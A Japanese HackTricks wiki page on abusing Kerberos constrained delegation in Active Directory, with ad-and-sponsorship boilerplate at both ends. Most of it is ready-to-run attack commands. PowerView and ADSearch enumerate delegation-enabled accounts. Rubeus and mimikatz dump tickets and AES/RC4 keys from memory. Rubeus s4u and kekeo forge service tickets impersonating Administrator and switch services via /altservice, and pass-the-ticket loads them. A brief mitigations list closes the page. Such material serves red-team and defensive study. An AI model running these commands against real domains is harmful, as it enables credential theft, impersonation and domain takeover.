# 制約付き委任

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 制約付き委任

これを使用すると、ドメイン管理者はコンピュータに対して、特定のマシンの**サービス**に対して**ユーザーやコンピュータを** **なりすまし**を**許可**することができます。

* **ユーザーのためのサービス自身に（**_**S4U2self**_**）：** **サービスアカウント**が_userAccountControl_の値に[TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D)を含んでいる場合、他のユーザーに代わって自分自身（サービス）のためのTGSを取得することができます。
* **ユーザーのためのサービスプロキシに（**_**S4U2proxy**_**）：** **サービスアカウント**は、**msDS-AllowedToDelegateTo**に設定されたサービスに任意のユーザーのTGSを取得することができます。これを行うには、まずそのユーザーから自分自身へのTGSが必要ですが、S4U2selfを使用してそのTGSを取得した後、他のTGSを要求することができます。

**注記**：ユーザーがADで「_アカウントは機密であり委任できない_」とマークされている場合、そのユーザーを**なりすまし**することは**できません**。

これは、サービスのハッシュを**侵害**した場合、ユーザーになりすまして、設定された**サービス**への**アクセス**を取得できることを意味します（可能な**権限昇格**）。

さらに、ユーザーがなりすまし可能なサービスへのアクセスだけでなく、SPN（要求されたサービス名）がチェックされていないため、任意のサービスへのアクセスも可能です。権限のみがチェックされます。したがって、**CIFSサービス**へのアクセスがある場合、Rubeusの`/altservice`フラグを使用して**HOSTサービス**へのアクセスも可能です。

また、**DC上のLDAPサービスアクセス**は、**DCSync**を悪用するために必要です。

{% code title="列挙" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% endcode %}

{% code title="TGTの取得" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
**TGTチケットを取得する他の方法**や、コンピュータのSYSTEMでなくても**RC4**や**AES256**を取得する方法があります。例えば、Printer Bugや制約なし委任、NTLMリレー、Active Directory Certificate Serviceの悪用などがあります。

**そのTGTチケット（またはハッシュ化されたもの）があれば、コンピュータ全体を侵害することなく、この攻撃を実行できます。**
{% endhint %}

{% code title="Rubeusを使用する" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
{% endcode %}

### 軽減策

* 可能な場合はkerberos委任を無効にする
* DA/Adminのログインを特定のサービスに限定する
* 特権アカウントに対して「アカウントは機密であり委任できない」と設定する。

[**ired.teamでさらに情報を得る。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**のGitHubリポジトリ[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
